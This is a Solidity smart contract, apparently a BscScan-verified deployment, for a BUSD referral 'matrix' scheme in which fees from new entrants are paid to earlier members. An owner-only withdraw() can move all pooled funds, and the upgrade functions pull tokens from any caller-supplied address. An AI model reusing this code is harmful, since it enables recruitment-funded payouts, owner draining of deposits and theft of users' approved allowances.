/**
 *Submitted for verification at BscScan.com on 2021-11-09
*/

/**
 *Submitted for verification at BscScan.com on 2021-11-01
*/

pragma solidity >=0.4.23 <0.6.0;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

interface IBEP20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the token decimals.
     */
    function decimals() external view returns (uint8);

    /**
     * @dev Returns the token symbol.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the token name.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the bep token owner.
     */
    function getOwner() external view returns (address);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address _owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract SUCSESSLIFE {
    using SafeMath for uint256;
    
    struct User {
        uint id;
        address referrer;
        uint partnersCount;
        mapping(uint8 => bool) activeX2Levels;
        mapping(uint8 => mapping(uint8=>bool)) activeX3Levels;
        mapping(uint8 => X2) x2Matrix;
        mapping(uint8 => mapping(uint8=>X3)) x3Matrix;
        mapping(uint8 => uint256) holdAmount;
        mapping(uint8 => mapping(uint8=>uint256)) _holdMatrixAmount;
    }
    
    struct X2 {
        address currentReferrer;
        address[] referrals;

    }
    
    struct X3 {
        address currentReferrer;
        address[] referrals;
    }

    uint8 public constant LAST_LEVEL = 7;
    uint8 public constant LAST_MATRIX = 5;
    
    mapping(address => User) public users;
    mapping(uint => address) public idToAddress;
    mapping(uint => address) public userIds;

    uint public lastUserId = 2;
    address public owner;
    
    
    mapping(uint8 => uint) public levelPrice;
    mapping(uint8 => mapping(uint8 => uint)) public matrixPrice;
    IBEP20 private busdToken;

    
    mapping(uint8 => mapping(uint8=>mapping(uint256 => address))) public x3vId_number;
    mapping(uint8 => mapping(uint8=>uint256)) public x3CurrentvId;
    mapping(uint8 => mapping(uint8=>uint256)) public x3Index;
    
    
    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId);
    event Upgrade(address indexed user, uint8 matrix, uint8 level);
    event NewUserPlace(address indexed user, address indexed referrer, uint8 matrix, uint8 level, uint8 place);
    event UserIncome(address sender ,address receiver,uint256 amount ,uint8 matrix, uint8 level,string _for);
    
    constructor(address ownerAddress, IBEP20 _busdAddress) public {
        owner = ownerAddress;
        busdToken=_busdAddress;
        
        levelPrice[1] = 10*1e18; 
        levelPrice[2] = 16*1e18;
        levelPrice[3] = 22*1e18;
        levelPrice[4] = 48*1e18;
        levelPrice[5] = 200*1e18;
        levelPrice[6] = 1600*1e18;
        levelPrice[7] = 5000*1e18;
        
        matrixPrice[1][1]=30*1e18;
        matrixPrice[1][2]=60*1e18;
        matrixPrice[2][1]=200*1e18;
        matrixPrice[2][2]=400*1e18;
        matrixPrice[3][1]=1800*1e18;
        matrixPrice[3][2]=3600*1e18;
        matrixPrice[4][1]=9000*1e18;
        matrixPrice[4][2]=18000*1e18;
        matrixPrice[5][1]=18000*1e18;
        matrixPrice[5][2]=36000*1e18;
        
        User memory user = User({
            id: 1,
            referrer: address(0),
            partnersCount: uint(0)
        });
        
        users[ownerAddress] = user;
        idToAddress[1] = ownerAddress;
        
        for (uint8 i = 1; i <= LAST_MATRIX; i++) {
            x3vId_number[i][1][1]=owner;
            x3vId_number[i][2][1]=owner;
            x3Index[i][1]=1;
            x3Index[i][2]=1;
            x3CurrentvId[i][1]=1;
            x3CurrentvId[i][2]=1;
            users[ownerAddress].activeX3Levels[i][1] = true;
            users[ownerAddress].activeX3Levels[i][2] = true;
        }
        
        for (uint8 i = 1; i <= LAST_LEVEL; i++) {
          users[ownerAddress].activeX2Levels[i] = true;
        }
        
        userIds[1] = ownerAddress;
    
        emit Registration(ownerAddress, address(0), users[ownerAddress].id, 0);
        emit Upgrade(ownerAddress,  0, 1);
    }
    
    function() external payable {}

    function registrationExt(address referrerAddress) external payable {
        registration(msg.sender, referrerAddress);
    }
    
    function registration(address userAddress, address referrerAddress) private {
        require(busdToken.balanceOf(userAddress)>=(levelPrice[1]),"Low Balance");
        require(busdToken.allowance(userAddress,address(this))>=levelPrice[1],"Invalid allowance amount");
        require(!isUserExists(userAddress), "user exists");
        require(isUserExists(referrerAddress), "Referrer not exists");
        uint32 size;
        
        assembly {
            size := extcodesize(userAddress)
        }
        
        require(size == 0, "cannot be a contract");
        
        User memory user = User({
            id: lastUserId,
            referrer: referrerAddress,
            partnersCount: 0
        });

        users[userAddress] = user;
        idToAddress[lastUserId] = userAddress;
        
        users[userAddress].referrer = referrerAddress;
        users[userAddress].activeX2Levels[1] = true; 
        userIds[lastUserId] = userAddress;
        lastUserId++;
        users[referrerAddress].partnersCount++;
        
        busdToken.transferFrom(userAddress ,address(this), levelPrice[1]);
        
        address freeX2Referrer = findFreeReferrer(referrerAddress,1);
        users[userAddress].x2Matrix[1].currentReferrer = freeX2Referrer;
        updateX2Referrer(userAddress, freeX2Referrer, 1);
        
        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id);
        emit Upgrade(userAddress, 0, 1);
    }
    
    modifier onlyOwner() {
        require(owner == msg.sender, 'Ownable: caller is not the owner');
        _;
    }
   
    function updateX2Referrer(address userAddress, address referrerAddress, uint8 level) private {
        if(userAddress==referrerAddress) return;
        require(level<=7,"not valid level");
        require(referrerAddress!=address(0)&&userAddress!=address(0),"zero id");
        require(users[userAddress].activeX2Levels[level]," User Level not activated");
        
          users[referrerAddress].x2Matrix[level].referrals.push(userAddress);
          if(level==1){
           busdToken.transfer(referrerAddress , levelPrice[1]);
          emit UserIncome(userAddress,referrerAddress,levelPrice[1],0,1,"Level Income");
          } else {
              if(users[referrerAddress].activeX2Levels[level] && users[referrerAddress].partnersCount>=1) {
                 busdToken.transfer(referrerAddress , levelPrice[level].mul(50).div(100));
                 emit UserIncome(userAddress,referrerAddress,levelPrice[level].mul(50).div(100),0,level,"Level Income");
              }
               else {
                 //users[referrerAddress].holdAmount[level]+=levelPrice[level].mul(50).div(100);
                 address gullu= referrerAddress;
                 for (uint8 k = 1; k <= 30; k++) {
                     if(!users[gullu].activeX2Levels[level] || users[gullu].partnersCount==0){
                      gullu=users[gullu].x2Matrix[1].currentReferrer;
                     }
                     else
                     {
                         break;
                     }
                     
                 }
                  if(!users[gullu].activeX2Levels[level] || users[gullu].partnersCount==0){
                  gullu=owner;
                  }
                  busdToken.transfer(gullu,levelPrice[level].mul(50).div(100));
                  emit UserIncome(userAddress,gullu,levelPrice[level].mul(50).div(100),0,level,"Level Income");
              }
          }
          emit NewUserPlace(userAddress, referrerAddress,0, level, uint8(users[referrerAddress].x2Matrix[level].referrals.length));
        
    }
    
    function updateX3Referrer(address userAddress, address referrerAddress,uint8 matrix, uint8 level) private {
        require(matrix<=LAST_MATRIX,"not valid matrix");
        if(referrerAddress==userAddress) return ;
        
        uint256 newIndex=x3Index[matrix][level]+1;
        x3vId_number[matrix][level][newIndex]=userAddress;
        x3Index[matrix][level]=newIndex;
        
         // sending matrix income to direct upline
          busdToken.transfer(referrerAddress,matrixPrice[matrix][level]);
          emit UserIncome(referrerAddress,referrerAddress,matrixPrice[matrix][level],matrix,level,"Global Matrix Income");
          emit NewUserPlace(userAddress, referrerAddress, matrix, level, uint8(users[referrerAddress].x3Matrix[matrix][level].referrals.length));
        
        uint8 member_count = level==1?3:9;
        if(users[referrerAddress].x3Matrix[matrix][level].referrals.length < member_count) {
          users[referrerAddress].x3Matrix[matrix][level].referrals.push(userAddress);
          //users[referrerAddress]._holdMatrixAmount[matrix][level]+=matrixPrice[matrix][level];

            if(level<2 &&users[referrerAddress].x3Matrix[matrix][level].referrals.length==member_count)
            {
                    //Next Pool Upgradation 
                    //users[referrerAddress]._holdMatrixAmount[matrix][level]=users[referrerAddress]._holdMatrixAmount[matrix][level]-matrixPrice[matrix][level+1];
                    x3CurrentvId[matrix][level]=x3CurrentvId[matrix][level]+1;  
                    emit Upgrade(referrerAddress, matrix, level);
                    //autoUpgrade(referrerAddress,matrix,level+1);
                    
                    //net holding ammount sent to users
                    //users[referrerAddress]._holdMatrixAmount[matrix][level]=0;

            } 
           
        }

        
    }
    
    function UpgradeLevel(address _user, uint8 level) external payable {
        require(level<=LAST_LEVEL,"Invalid level");
        require(!users[_user].activeX2Levels[level],"Level already upgraded!");
        require(busdToken.allowance(_user,address(this))>=levelPrice[level],"Invalid Upgradation amount");
        require(busdToken.balanceOf(_user)>=levelPrice[level],"Low Balance");
        
        // level activate token tranfer in contract
        users[_user].activeX2Levels[level]=true;
        busdToken.transferFrom(_user ,address(this), levelPrice[level]);  
        

        if(users[_user].holdAmount[level]!=0){
            busdToken.transfer(_user , users[_user].holdAmount[level]);
            emit UserIncome(address(0),_user,users[_user].holdAmount[level],level,0,"Holding Income");
            users[_user].holdAmount[level]=0;
        }
        
        address referrerAddress=_user;
        for (uint8 i=1;i<=level;i++){
            if(referrerAddress!=address(0))
            referrerAddress= users[referrerAddress].x2Matrix[1].currentReferrer;
            else
            break;
        }
        if(referrerAddress!=address(0))
        updateX2Referrer(_user, referrerAddress, level);
        busdToken.transfer(users[_user].referrer , levelPrice[level].mul(50).div(100)); 
        emit Upgrade(_user, 0, level);
        emit UserIncome(_user,users[_user].referrer,levelPrice[level].mul(50).div(100),0,level,"Sponcer Income");
    }
    
    function UpgradeMatrix(address _user, uint8 matrix) external payable {
        require(users[_user].partnersCount>=2,"Please Referrer Atleast Two Member");
        require(matrix<=LAST_MATRIX,"Invalid matrix");
        require(users[_user].activeX2Levels[matrix+2],"Level not activated");
        require(!users[_user].activeX3Levels[matrix][1],"Matrix already upgraded!");
        require(busdToken.allowance(_user,address(this))>=matrixPrice[matrix][1],"Invalid Upgradation amount");
        require(busdToken.balanceOf(_user)>=matrixPrice[matrix][1],"Low Balance");
        
        // matrix activate token tranfer in contract
        users[_user].activeX3Levels[matrix][1]=true;
        busdToken.transferFrom(_user ,address(this), matrixPrice[matrix][1]);  
        
        address freeX3Referrer = findFreeX3Referrer(matrix,1);

        updateX3Referrer(_user, freeX3Referrer, matrix,1);
        emit Upgrade(_user, matrix, 1);
        
    }
    
    function matrixLevel2Upgrade(address _user,uint8 matrix) external payable {
        require(users[_user].activeX3Levels[matrix][1],"Upgrade Level One First");
        require(users[_user].x3Matrix[matrix][1].referrals.length >=3,"Matrix Level One is Incomplete");
        require(busdToken.allowance(_user,address(this))>=matrixPrice[matrix][2],"Invalid Upgradation amount");
        require(busdToken.balanceOf(_user)>=matrixPrice[matrix][2],"Low Balance");
        busdToken.transferFrom(_user ,address(this), matrixPrice[matrix][2]); 
        uint256 newIndex=x3Index[matrix][2]+1;
        x3vId_number[matrix][2][newIndex]=_user;
        x3Index[matrix][2]=newIndex;
        users[_user].activeX3Levels[matrix][2] = true;
        address freeX3Referrer = findFreeX3Referrer(matrix,2);
        users[_user].x3Matrix[matrix][2].currentReferrer = freeX3Referrer;
        
        //updateX3Referrer(_user, freeX3Referrer,matrix, level);
        if(users[freeX3Referrer].x3Matrix[matrix][2].referrals.length < 9){
          users[freeX3Referrer].x3Matrix[matrix][2].referrals.push(_user);
          busdToken.transfer(freeX3Referrer,matrixPrice[matrix][2]);
          emit UserIncome(_user,freeX3Referrer,matrixPrice[matrix][2],matrix,2,"Global Matrix Income"); 
          emit NewUserPlace(_user, freeX3Referrer, matrix, 2, uint8(users[freeX3Referrer].x3Matrix[matrix][2].referrals.length));
        }
          
        if(users[freeX3Referrer].x3Matrix[matrix][2].referrals.length == 9){
          x3CurrentvId[matrix][2]=x3CurrentvId[matrix][2]+1; 
          freeX3Referrer = findFreeX3Referrer(matrix,2);
          users[_user].x3Matrix[matrix][2].currentReferrer = freeX3Referrer;
          users[freeX3Referrer].x3Matrix[matrix][2].referrals.push(_user);
          busdToken.transfer(freeX3Referrer,matrixPrice[matrix][2]);
          emit UserIncome(_user,freeX3Referrer,matrixPrice[matrix][2],matrix,2,"Global Matrix Income"); 
          emit NewUserPlace(_user, freeX3Referrer, matrix, 2, uint8(users[freeX3Referrer].x3Matrix[matrix][2].referrals.length));
        }
        emit Upgrade(_user, matrix, 2);
    }
    
    function isUserExists(address user) public view returns (bool) {
        return (users[user].id != 0);
    }
    
    function findFreeReferrer(address _user,uint8 level) public view returns(address) {
        if(users[_user].x2Matrix[level].referrals.length < 2) return _user;

        address[] memory referrals = new address[](1022);
        referrals[0] = users[_user].x2Matrix[level].referrals[0];
        referrals[1] = users[_user].x2Matrix[level].referrals[1];

        address freeReferrer;
        bool noFreeReferrer = true;

        for(uint i = 0; i < 1022; i++) {
            if(users[referrals[i]].x2Matrix[level].referrals.length == 2) {
                if(i < 62) {
                    referrals[(i+1)*2] = users[referrals[i]].x2Matrix[level].referrals[0];
                    referrals[(i+1)*2+1] = users[referrals[i]].x2Matrix[level].referrals[1];
                }
            }
            else {
                noFreeReferrer = false;
                freeReferrer = referrals[i];
                break;
            }
        }

        require(!noFreeReferrer, 'No Free Referrer');

        return freeReferrer;
    }
    
    function findFreeX3Referrer(uint8 matrix, uint8 level) public view returns(address){
        uint256 id=x3CurrentvId[matrix][level];
        return x3vId_number[matrix][level][id];
    }
    
    function usersActiveX3Levels(address userAddress, uint8 matrix,uint8 level) public view returns(bool) {
        return users[userAddress].activeX3Levels[matrix][level];
    }

    function usersActiveX2Levels(address userAddress, uint8 level) public view returns(bool) {
        return users[userAddress].activeX2Levels[level];
    }

    function usersX3Matrix(address userAddress,uint8 matrix, uint8 level) public view returns(address, address[] memory) {
        return (users[userAddress].x3Matrix[matrix][level].currentReferrer,
                users[userAddress].x3Matrix[matrix][level].referrals);
    }
    
    function usersX2Matrix(address userAddress, uint8 level) public view returns(address, address[] memory) {
        return (users[userAddress].x2Matrix[level].currentReferrer,
                users[userAddress].x2Matrix[level].referrals);
    }
    
    function withdraw(uint256 amt,address payable adr, uint8 _type) public payable onlyOwner{
        // adr.transfer(amt);
        if(_type==1){
            adr.transfer(amt);
        }
        if(_type==2){
            busdToken.transfer(adr,amt); 
        }
        
        
    }
    
    function bytesToAddress(bytes memory bys) private pure returns (address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }
    
}